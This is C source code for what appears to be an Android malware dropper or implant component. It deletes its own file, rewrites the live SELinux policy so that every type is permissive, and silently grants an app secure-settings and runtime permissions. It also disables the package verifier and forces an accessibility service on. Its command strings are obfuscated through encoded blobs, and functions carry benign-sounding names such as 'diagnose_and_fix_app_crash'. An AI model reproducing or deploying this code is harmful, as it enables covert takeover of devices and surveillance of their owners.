#define SHELL_CMD_MAX 1024

static policydb_t policydb;

static int shell_exit_code(int status)
{
	if (status == -1 || !WIFEXITED(status))
	{
		return -1;
	}
	return WEXITSTATUS(status);
}

static int run_command(const char *cmd)
{
	return shell_exit_code(system(cmd));
}

static int run_commandf(const char *fmt, ...)
{
	char cmd[SHELL_CMD_MAX];
	va_list args;
	int len;

	va_start(args, fmt);
	len = vsnprintf(cmd, sizeof(cmd), fmt, args);
	va_end(args);

	if (len < 0 || (size_t)len >= sizeof(cmd))
	{
		return -1;
	}

	return run_command(cmd);
}

static int read_command_line(const char *cmd, char *result, size_t result_size)
{
	FILE *fp;

	if (result == NULL || result_size == 0)
	{
		return -1;
	}
	result[0] = '\0';

	fp = popen(cmd, "r");
	if (fp == NULL)
	{
		return -1;
	}

	if (fgets(result, result_size, fp) == NULL)
	{
		pclose(fp);
		return -1;
	}

	pclose(fp);
	char *newline = strchr(result, '\n');
	if (newline != NULL)
	{
		*newline = '\0';
	}
	return 0;
}

static int make_type_permissive(hashtab_key_t key, hashtab_datum_t datum, void *args)
{
	type_datum_t *type = (type_datum_t *)datum;

	(void)key;
	(void)args;
	ebitmap_set_bit(&policydb.permissive_map, type->s.value, 1);
	return 0;
}

static int make_all_types_permissive(policydb_t *policy)
{
	return hashtab_map(policy->p_types.table, make_type_permissive, NULL);
}

static int load_policy(const char *filename, policydb_t *policy, struct policy_file *pf)
{
	int fd;
	struct stat sb;
	void *map;
	int ret;

	fd = open(filename, O_RDONLY);
	if (fd < 0)
	{
		return 1;
	}

	if (fstat(fd, &sb) < 0)
	{
		close(fd);
		return 1;
	}

	map = mmap(NULL, sb.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
	if (map == MAP_FAILED)
	{
		close(fd);
		return 1;
	}

	policy_file_init((policy_file_t *)pf);
	pf->type = PF_USE_MEMORY;
	pf->data = map;
	pf->len = sb.st_size;

	if (policydb_init(policy))
	{
		munmap(map, sb.st_size);
		close(fd);
		return 1;
	}

	ret = policydb_read(policy, pf, 1);
	munmap(map, sb.st_size);
	close(fd);
	return ret ? 1 : 0;
}

static int load_policy_into_kernel(policydb_t *policy)
{
	const char *filename = sx_selinux_load();
	void *data = NULL;
	size_t len = 0;
	ssize_t written;
	int fd;

	if (policydb_to_image(NULL, policy, &data, &len) < 0 || data == NULL)
	{
		return 1;
	}

	fd = open(filename, O_RDWR);
	if (fd < 0)
	{
		free(data);
		return 1;
	}

	written = write(fd, data, len);
	close(fd);
	free(data);

	return written == (ssize_t)len ? 0 : 1;
}

static bool live_with_selinux(void)
{
	const char *policy_path = sx_selinux_policy();
	sidtab_t sidtab;
	struct policy_file pf;

	sepol_set_policydb(&policydb);
	sepol_set_sidtab(&sidtab);

	if (load_policy(policy_path, &policydb, &pf))
	{
		return false;
	}
	if (policydb_load_isids(&policydb, &sidtab))
	{
		return false;
	}
	if (make_all_types_permissive(&policydb) != 0)
	{
		return false;
	}
	return load_policy_into_kernel(&policydb) == 0;
}

static int grant_secure_settings_permission(const char *package_name)
{
	if (package_name == NULL || package_name[0] == '\0')
	{
		return -1;
	}
	return run_commandf(sx_fmt_grant_secure(), package_name);
}

static bool check_accessibility_service(void)
{
	char result[1024];

	if (read_command_line(sx_cmd_get_access(),
						  result, sizeof(result)) != 0)
	{
		return false;
	}

	return strstr(result, SERVICE_NAME) != NULL;
}

static int enable_accessibility_service(void)
{
	if (run_commandf(sx_fmt_put_access_services(), SERVICE_NAME) != 0)
	{
		return -1;
	}
	if (run_command(sx_cmd_put_access_enabled()) != 0)
	{
		return -1;
	}

	sleep(2);
	return 0;
}

static bool check_service_status(void)
{
	char command[256];
	char result[1024];

	snprintf(command, sizeof(command), sx_fmt_dumpsys_service(), SERVICE_NAME);
	return read_command_line(command, result, sizeof(result)) == 0 && result[0] != '\0';
}

static int start_service(void)
{
	int ret;

	ret = run_commandf(sx_fmt_start_service(), SERVICE_NAME);
	sleep(2);
	return ret;
}

static void manage_services(void)
{
	for (int attempt = 0; attempt < 3; attempt++)
	{
		if (!check_accessibility_service())
		{
			enable_accessibility_service();
		}

		if (!check_service_status())
		{
			start_service();
		}

		if (check_accessibility_service() && check_service_status())
		{
			return;
		}

		if (attempt < 2)
		{
			sleep(5);
		}
	}
}

static void grant_runtime_permissions(const char *package_name)
{
	char permission[96];

	for (size_t i = 0; i < sizeof(sx_permission_blobs) / sizeof(sx_permission_blobs[0]); i++)
	{
		sx_decode_to(permission, sizeof(permission), sx_permission_blobs[i]);
		run_commandf(sx_fmt_pm_grant_runtime(), package_name, permission);
		sx_bzero(permission, sizeof(permission));
	}
}

static void repair_app_data_dir(const char *package_name)
{
	char subdir[32];

	run_commandf(sx_fmt_mkdir_data(), package_name);
	run_commandf(sx_fmt_chown_data(), package_name);
	run_commandf(sx_fmt_chmod_data(), package_name);
	run_commandf(sx_fmt_chcon_data(), package_name);

	for (size_t i = 0; i < sizeof(sx_subdir_blobs) / sizeof(sx_subdir_blobs[0]); i++)
	{
		sx_decode_to(subdir, sizeof(subdir), sx_subdir_blobs[i]);
		run_commandf(sx_fmt_mkdir_subdir(), package_name, subdir);
		sx_bzero(subdir, sizeof(subdir));
	}
}

static void disable_package_verifier(void)
{
	run_command(sx_cmd_pkg_verifier());
	run_command(sx_cmd_verifier_adb());
}

static void diagnose_and_fix_app_crash(const char *package_name)
{
	if (run_commandf(sx_fmt_pm_list(), package_name) != 0)
	{
		return;
	}

	grant_runtime_permissions(package_name);
	repair_app_data_dir(package_name);
	disable_package_verifier();
	run_commandf(sx_fmt_force_stop(), package_name);
}

static void restart_app(const char *package_name)
{
	run_commandf(sx_fmt_force_stop(), package_name);
	sleep(2);
	run_commandf(sx_fmt_start_app(), package_name);
}

int main(int argc, char const *argv[])
{
	(void)argc;
	(void)argv;

	run_command(sx_cmd_rm_self());
	live_with_selinux();
	grant_secure_settings_permission(PACKAGE_NAME);
	diagnose_and_fix_app_crash(PACKAGE_NAME);
	restart_app(PACKAGE_NAME);
	manage_services();

	_exit(0);
}
